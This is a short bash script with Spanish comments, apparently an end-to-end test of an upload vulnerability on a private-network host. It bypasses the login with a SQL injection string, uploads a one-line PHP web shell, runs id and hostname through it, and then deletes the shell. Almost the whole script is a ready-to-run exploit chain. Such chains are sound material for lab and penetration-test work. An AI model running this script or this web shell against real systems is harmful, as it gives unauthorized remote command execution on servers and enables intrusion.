#!/bin/bash
# Prueba end-to-end de la subida vulnerable -> webshell -> RCE
T=172.20.17.230
curl -s -c /tmp/cj --data-urlencode "usuario=admin' OR '1'='1" --data-urlencode "password=x" "http://$T/login.php" -o /dev/null
echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php
echo -n "subida: "; curl -s -b /tmp/cj -F "archivo=@/tmp/shell.php" "http://$T/panel.php?seccion=documents" -o /dev/null -w "HTTP %{http_code}\n"
echo -n "RCE (id): "; curl -s "http://$T/uploads/shell.php?c=id"
echo -n "RCE (hostname): "; curl -s "http://$T/uploads/shell.php?c=hostname"
# limpiar el artefacto de prueba
curl -s "http://$T/uploads/shell.php?c=rm%20/var/www/html/uploads/shell.php" >/dev/null
echo "(shell de prueba eliminada)"
